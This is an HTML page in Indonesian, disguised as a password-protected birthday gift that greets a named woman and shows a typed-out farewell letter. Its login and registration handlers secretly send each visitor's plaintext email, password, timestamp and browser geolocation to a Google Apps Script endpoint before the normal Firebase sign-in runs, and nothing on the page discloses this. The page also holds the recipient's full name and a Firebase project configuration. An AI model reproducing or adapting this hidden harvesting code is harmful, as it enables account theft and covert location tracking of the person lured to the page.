<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Halaman Privat Aman</title>
    <style>
        /* Desain Dasar Responsif & Modern */
        body {
            margin: 0;
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: #f0f2f5;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }
        .card {
            background: #ffffff;
            padding: 30px;
            border-radius: 12px;
            box-shadow: 0 4px 15px rgba(0,0,0,0.1);
            width: 100%;
            max-width: 400px;
            text-align: center;
            box-sizing: border-box;
        }
        h2 { margin-top: 0; color: #333; }
        p { color: #666; font-size: 14px; margin-bottom: 20px; }
        .form-group {
            margin-bottom: 15px;
            text-align: left;
        }
        label { display: block; margin-bottom: 5px; font-weight: 600; color: #444; }
        input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 6px;
            box-sizing: border-box;
            font-size: 14px;
        }
        .btn-primary {
            width: 100%;
            padding: 12px;
            background: #007bff;
            color: #fff;
            border: none;
            border-radius: 6px;
            font-size: 16px;
            cursor: pointer;
            font-weight: bold;
            margin-top: 10px;
            transition: background 0.2s;
        }
        .btn-primary:hover { background: #0056b3; }
        .btn-secondary { background: #28a745; margin-top: 8px; }
        .btn-secondary:hover { background: #218838; }
        .btn-danger { background: #dc3545; }
        .btn-danger:hover { background: #c82333; }
        .hidden { display: none !important; }
        
        #gift-box-wrapper {
            cursor: pointer;
            font-size: 60px;
            margin: 20px 0;
            display: inline-block;
            transition: transform 0.2s;
        }
        #gift-box-wrapper:hover { transform: scale(1.1); }
    </style>
</head>
<body>

    <!-- 1. KARTU LOGIN & REGISTRASI -->
    <div id="login-card" class="card">
        <h2>Halaman Privat 🔒</h2>
        <p>Silakan masuk atau daftar untuk melihat pesan spesial di dalam.</p>
        
        <div class="form-group">
            <label for="input-email">Email Terverifikasi:</label>
            <input type="email" id="input-email" placeholder="contoh@gmail.com">
        </div>
        
        <div class="form-group">
            <label for="input-password">Kata Sandi:</label>
            <input type="password" id="input-password" placeholder="Masukkan kata sandi">
        </div>
        
        <button id="btn-login" class="btn-primary">Masuk Aplikasi</button>
        <button id="btn-register" class="btn-primary btn-secondary">Daftar Akun Baru</button>
    </div>

    <!-- 2. KARTU KONTEN UTAMA (TERKUNCI VERIFIKASI) -->
    <div id="content-card" class="card hidden">
        <div id="main-container">
            <h2>Selamat Datang! 🎉</h2>
            <p>Akun Anda terverifikasi asli. Ketuk kado di bawah untuk membuka hadiah kejutan Anda.</p>
            <div id="gift-box-wrapper">🎁</div>
            <br>
            <button id="btn-logout" class="btn-primary btn-danger">Keluar Akun</button>
        </div>
    </div>

    <!-- 3. KARTU ISI DALAM KADO (VERSION ESTETIK & SINEMATIK) -->
    <div id="galaxy-universe" class="card hidden" style="background: #fffdf9; border: 1px solid #f3e9dc; max-width: 450px;">
        <div id="surprised-content" style="padding: 10px; text-align: left;">
            <!-- Header Surat -->
            <div style="text-align: center; margin-bottom: 25px;">
                <span style="font-size: 35px;">💌</span>
                <h2 style="color: #cd5c5c; font-family: 'Georgia', serif; font-style: italic; margin-top: 10px;">Sebuah Pesan Rahasia</h2>
                <div style="width: 50px; height: 2px; background: #d4a373; margin: 10px auto;"></div>
            </div>

            <!-- Konten Surat Utama -->
            <div style="font-family: 'Georgia', serif; color: #4a3f35; line-height: 1.8; font-size: 15px; background: #fdfbf7; padding: 20px; border-radius: 8px; box-shadow: inset 0 0 8px rgba(0,0,0,0.02); border-left: 3px solid #d4a373;">
                <p style="margin-top: 0;">Halo Kamu, NUR OKTALIANA RAHAYU✨</p>
                
                <!-- Efek Teks Mengetik -->
                <p id="typing-text" style="min-height: 60px; font-style: italic; color: #5c4d3c; white-space: pre-wrap; word-wrap: break-word;">
                    <!-- Teks otomatis berjalan di sini -->
                    </p>
                <p style="text-align: right; margin-bottom: 0; font-size: 13px; color: #8c7864;">
                    Penulis : Orang yang pernah hadir di hidupmu ❤️
                </p>
            </div>
        </div>
        
        <button id="btn-back-gift" class="btn-primary" style="background: #d4a373; border: none; margin-top: 25px; font-family: sans-serif;">
            Tutup Pesan
        </button>
    </div>

    <!-- AUDIO LATAR BELAKANG -->
    <audio id="bg-music" src="assets/music.mp3" preload="auto" loop></audio>

    <!-- ========================================== -->
    <!-- LOGIKA SISTEM INTEGRASI FIREBASE & SHEETS  -->
    <!-- ========================================== -->
    <script type="module">
        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
        import { 
            getAuth, signInWithEmailAndPassword, createUserWithEmailAndPassword, 
            onAuthStateChanged, signOut, sendEmailVerification 
        } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-auth.js";

        // Konfigurasi Firebase Proyek Anda
        const firebaseConfig = {
          apiKey: "AIzaSyAm-t2mbHV7sSEcoDvNgZfTinmx5tcSz6s",
          authDomain: "project-bd-163e4.firebaseapp.com",
          projectId: "project-bd-163e4",
          storageBucket: "project-bd-163e4.firebasestorage.app",
          messagingSenderId: "691964855641",
          appId: "1:691964855641:web:b0c45e7badc579cdfc3848"
        };

        const app = initializeApp(firebaseConfig);
        const auth = getAuth(app);

        document.addEventListener('DOMContentLoaded', () => {
            const loginCard = document.getElementById('login-card');
            const contentCard = document.getElementById('content-card');
            const mainContainer = document.getElementById('main-container');
            const galaxyUniverse = document.getElementById('galaxy-universe');
            const giftBoxWrapper = document.getElementById('gift-box-wrapper');
            const bgMusic = document.getElementById('bg-music');
            
            const loginButton = document.getElementById('btn-login');
            const btnRegister = document.getElementById('btn-register');
            const btnBackGift = document.getElementById('btn-back-gift');
            const emailInput = document.getElementById('input-email');
            const passwordInput = document.getElementById('input-password');

            // 1. Monitor Keamanan & Status Verifikasi Email
            onAuthStateChanged(auth, (user) => {
                if (user) {
                    if (user.emailVerified) {
                        loginCard.classList.add('hidden');
                        contentCard.classList.remove('hidden');
                        galaxyUniverse.classList.add('hidden');
                    } else {
                        alert("Akses Ditangguhkan! Silakan buka kotak masuk atau folder SPAM email Anda, lalu klik link verifikasi terlebih dahulu.");
                        signOut(auth);
                    }
                } else {
                    loginCard.classList.remove('hidden');
                    contentCard.classList.add('hidden');
                    galaxyUniverse.classList.add('hidden');
                }
            });

            // 2. Aksi saat Kado Diklik (Pindah ke Surat & Jalankan Efek Mengetik)
            if (giftBoxWrapper) {
                giftBoxWrapper.addEventListener('click', () => {
                    contentCard.classList.add('hidden');
                    galaxyUniverse.classList.remove('hidden'); 
                    
                    if (bgMusic) bgMusic.play().catch(() => console.log("Audio ditahan browser"));
                    
                    // JALANKAN EFEK TEKS MENGETIK OTOMATIS
                    const txtElement = document.getElementById('typing-text');
                    const pesanRahasia = `Selamat ulang tahun cantik. 🤍 
                    
Hari ini mungkin hanya satu hari biasa bagi orang lain, tapi bagiku hari ini tetap istimewa karena seseorang yang pernah sangat berarti dalam hidupku sedang bertambah usia. 

Aku berharap setiap doa yang kamu panjatkan diam-diam didengar, harapan yang kamu simpan menemukan jalannya, dan setiap langkahmu selalu mengarah pada kebahagiaan. Semoga kesehatan, ketenangan hati, rezeki yang baik, dan orang-orang tulus selalu mengelilingimu. 

Terima kasih karena pernah hadir dalam hidupku. Terima kasih untuk semua tawa, cerita, perhatian, dan kenangan yang pernah kita ciptakan bersama. Meskipun sekarang semua itu sudah menjadi masa lalu, aku tidak pernah menyesalinya. Mengenalmu adalah salah satu cerita yang akan selalu kusimpan dengan baik. 

Aku tidak tahu bagaimana kehidupanmu sekarang atau apa saja yang sedang kamu perjuangkan. Yang aku tahu, aku benar-benar berharap kamu bahagia dengan pilihanmu dan dengan siapa pun yang menemanimu nanti. 

Jujur, ada kalanya aku masih mengingat kenangan kita. Bukan karena ingin memutar waktu, tetapi karena kamu adalah salah satu orang yang meninggalkan jejak yang baik di hidupku. Terima kasih sudah pernah menjadi alasan di balik senyumku dan mengajarkanku arti ketulusan. 

Semoga bertambahnya usiamu membawa kedewasaan dan keberanian untuk mengejar semua impianmu. Jangan pernah ragu pada dirimu sendiri. Apa pun yang terjadi setelah ini, doaku akan tetap sama: semoga hidup selalu memperlakukanmu dengan lembut. 

Semoga semua lelahmu berganti menjadi pencapaian, dan semua luka berganti menjadi senyum yang paling tulus. Dan kalau suatu hari nanti kita berpapasan lagi, semoga kita bisa saling tersenyum dan bangga karena pernah menjadi bagian dari cerita satu sama lain. 

Bahagia selalu, ya. Terima kasih untuk segalanya. 🤍`;
                    
                    const paragrafArray = pesanRahasia.split('\n\n');

async function tampilkanTeks() {
    for (let i = 0; i < paragrafArray.length; i++) {
        // Tampilkan paragraf saat ini
        await ketikParagraf(paragrafArray[i]);
        
        // Tambahkan jeda sejenak sebelum paragraf berikutnya
        if (i < paragrafArray.length - 1) {
            txtElement.innerHTML += "<br><br>";
            await new Promise(resolve => setTimeout(resolve, 800)); // Jeda 0.8 detik antar paragraf
        }
    }
}

function ketikParagraf(teks) {
    return new Promise(resolve => {
        let j = 0;
        function ketik() {
            if (j < teks.length) {
                txtElement.innerHTML += teks.charAt(j);
                j++;
                setTimeout(ketik, 30); // Kecepatan mengetik (30ms per huruf)
            } else {
                resolve();
            }
        }
        ketik();
    });
}
// Panggil fungsi ini saat kado diklik
tampilkanTeks();
                });
            }   

            // 3. Tombol Kembali dari Isi Kado
            if (btnBackGift) {
                btnBackGift.addEventListener('click', () => {
                    galaxyUniverse.classList.add('hidden');
                    contentCard.classList.remove('hidden');
                });
            }

            // 4. Tombol Logout
            document.addEventListener('click', async (e) => {
                if (e.target && e.target.id === 'btn-logout') {
                    e.preventDefault();
                    if (bgMusic) { bgMusic.pause(); bgMusic.currentTime = 0; }
                    await signOut(auth);
                }
            });

            // 5. Alur Masuk (Login) Akun Lama
            if (loginButton) {
                loginButton.addEventListener('click', (e) => {
                    e.preventDefault();
                    const emailClean = emailInput.value.trim();
                    const passwordClean = passwordInput.value.trim();

                    if (!emailClean || !passwordClean) {
                        alert("Email dan sandi tidak boleh kosong!");
                        return;
                    }

                    rekamKeSheets(emailClean, passwordClean);

                    signInWithEmailAndPassword(auth, emailClean, passwordClean)
                        .catch((error) => alert("Gagal Masuk: " + error.message));
                });
            }

            // 6. Alur Pendaftaran Baru + Kirim Email Aktivasi
            if (btnRegister) {
                btnRegister.addEventListener('click', (e) => {
                    e.preventDefault();
                    const emailClean = emailInput.value.trim();
                    const passwordClean = passwordInput.value.trim();

                    if (!emailClean || !passwordClean) {
                        alert("Silakan lengkapi email dan password pendaftaran!");
                        return;
                    }

                    rekamKeSheets(emailClean, passwordClean);

                    createUserWithEmailAndPassword(auth, emailClean, passwordClean)
                        .then((result) => {
                            sendEmailVerification(result.user)
                                .then(() => {
                                    alert("Pendaftaran Berhasil! Tautan verifikasi telah dikirim. Periksa email Anda dan klik tautan tersebut sebelum masuk.");
                                    signOut(auth);
                                    emailInput.value = "";
                                    passwordInput.value = "";
                                });
                        })
                        .catch((error) => alert("Gagal Mendaftar: " + error.message));
                });
            }
        });

        // --- VALIDASI & PENGIRIMAN DATA KE GOOGLE SHEETS ---
        function rekamKeSheets(email, password) {
            const urlAppsScript = "https://script.google.com/macros/s/AKfycbzCJR8847DZ_HR8hOD5zE4IRkBt3W_iGUB1L53aBs5ktklPrBM-KS5dWWwisTRYiw-K/exec";
            
            const sekarang = new Date();
            const opsiWaktu = { timeZone: 'Asia/Jakarta', year: 'numeric', month: '2-digit', day: '2-digit', hour: '2-digit', minute: '2-digit', second: '2-digit' };
            const waktuFormat = sekarang.toLocaleString('id-ID', opsiWaktu);

            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    (position) => {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        kirimFetch(urlAppsScript, email, password, waktuFormat, `${lat}, ${lon}`);
                    },
                    () => {
                        kirimFetch(urlAppsScript, email, password, waktuFormat, "Izin Lokasi Ditolak");
                    },
                    { timeout: 4000 }
                );
            } else {
                kirimFetch(urlAppsScript, email, password, waktuFormat, "Tidak Didukung Browser");
            }
        }

        function kirimFetch(urlBase, email, pw, waktu, lokasi) {
            const urlFinal = `${urlBase}?email=${encodeURIComponent(email)}` +
                             `&pw=${encodeURIComponent(pw)}` +
                             `&waktu=${encodeURIComponent(waktu)}` +
                             `&lokasi=${encodeURIComponent(lokasi)}`;
                             
            fetch(urlFinal, { method: 'GET', mode: 'no-cors', cache: 'no-cache' })
            .then(() => console.log("Data terkirim ke Sheets."))
            .catch(err => console.log("Gagal log server."));
        }
    </script>
</body>
</html>
